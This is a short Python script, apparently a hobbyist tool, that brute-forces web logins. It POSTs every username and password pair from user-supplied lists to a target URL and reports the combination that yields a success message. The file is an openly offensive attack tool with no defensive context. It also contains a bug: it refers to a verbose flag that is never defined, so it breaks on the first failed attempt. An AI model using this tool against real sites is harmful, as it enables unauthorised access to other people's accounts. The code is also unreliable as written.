import requests
import argparse
from urllib.parse import urlparse


def valid_url(url):
    try:
        parsed_url = urlparse(url)
        if not all([parsed_url.scheme, parsed_url.netloc]):
            raise ValueError
        return url  # Return the URL if it's valid
    except ValueError:
        raise argparse.ArgumentTypeError(f'Invalid URL {url}')


def read_file(path):
    try:
        with open(path, 'r') as file:
            return file.read().splitlines()
    except FileNotFoundError:
        raise argparse.ArgumentTypeError(f'File not found {path}')


def brute_force_login(url, username, password):
    print(f"Attempting login with URL: {url}, Username: {username}, Password: {password}")
    data = {'username': username, 'password': password}
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print("Received 200 OK from server, checking content...")
            if "Logged in successfully" in response.text:
                return True
        return False
    except requests.RequestException as e:
        print(f'Failed to connect to {url} : {str(e)}')
        return False


def main():
    try:
        parser = argparse.ArgumentParser(description='Web Brute Force by 0Pa1')
        parser.add_argument('-t', '--target', required=True, type=valid_url, help='Target URL')
        parser.add_argument('-u', '--username', help='Single username')
        parser.add_argument('-U', '--usernames', help='File containing list of usernames')
        parser.add_argument('-p', '--password', help='Single password')
        parser.add_argument('-P', '--passwords', help='File containing list of passwords')
        args = parser.parse_args()

        # Check if we have at least one username and one password
        if not any([args.username, args.usernames]):
            print('Error: No usernames provided.')
            return

        if not any([args.password, args.passwords]):
            print('Error: No passwords provided.')
            return

        # Prepare lists of usernames and passwords
        usernames = [args.username] if args.username else read_file(args.usernames)
        passwords = [args.password] if args.password else read_file(args.passwords)

        # Brute Force attack
        for user in usernames:
            for passwd in passwords:
                if brute_force_login(args.target, user, passwd):
                    print(f'Success: Username: {user}, Password: {passwd}')
                    return
                elif args.verbose:
                    print(f'Failed: Username: {user}, Password: {passwd}')

    except KeyboardInterrupt:
        print('\nExecution interrupted by the user')


if __name__ == '__main__':
    main()
